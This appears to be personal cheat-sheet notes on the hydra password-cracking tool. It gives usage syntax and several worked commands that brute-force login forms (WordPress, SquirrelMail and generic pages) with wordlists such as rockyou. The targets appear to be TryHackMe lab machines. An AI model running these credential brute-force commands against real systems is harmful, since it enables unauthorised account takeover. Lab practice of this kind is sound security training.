---
id: hydra
aliases: []
tags: []
---

Usage:

  For services:
    `$ hydra -L <file of usernames> -P <file of passwords> <target IP> <target service>`
    `$ hydra -l <username> -p <password> <target IP> <target service>`

    e.g.

  For http-form:
    `$ hydra -L <file of usernames> -P <file of passwords> <target IP> -V http-form-post '[endpoint]:[user_post_var]=^USER^&[password]=^PASS^:[fail response]'`

    e.g.

    `$ hydra -l Elliot -P ~/Cybersec/boxes/THM/easy/MrRobot/pruned_list.dic  10.10.134.143 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In'`
	
	  `$ hydra -L users -P /usr/share/wordlists/rockyou.txt  10.10.244.75 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`
	
  	`$ hydra -l milesdyson -P logs/log1.txt 10.10.64.219 -V http-form-post "/squirrelmail/src/login.php:login_username=^USER^&secretkey=^PASS^:incorrect"`
	
  	`$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.0.109 -V http-form-post "/blog/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2Finternal.thm%2Fblog%2Fwp-admin%2F&testcookie=1:F=incorrect"`

    `$ hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 10.10.22.145 -V http-form-post ‘/login.php:username=^USER^&password=^PASS^:Invalid’`
